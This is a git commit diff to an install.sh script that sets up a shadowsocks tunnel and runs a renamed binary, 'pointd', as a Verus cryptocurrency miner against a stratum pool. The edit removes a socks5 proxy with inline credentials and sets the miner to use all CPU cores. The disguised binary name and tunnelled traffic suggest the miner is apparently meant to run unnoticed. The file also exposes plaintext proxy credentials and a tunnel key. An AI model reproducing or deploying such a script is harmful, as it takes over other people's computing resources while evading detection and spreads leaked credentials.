50fc13ff10e167b35bd0a88c71b3b5b5835062e6
ploretope <102384014+ploretope@users.noreply.github.com>
2022-05-30 00:29:32 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,4 +7,4 @@ chmod +x pointd
 sudo apt -y install shadowsocks-libev rng-tools libsodium-dev
 ph add pointd
 ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
-./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.B20.1 -p x -t 16 -x socks5://Novax:chalHatt@129.158.58.77:1080
+./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.B20.1 -p x -t $(nproc)
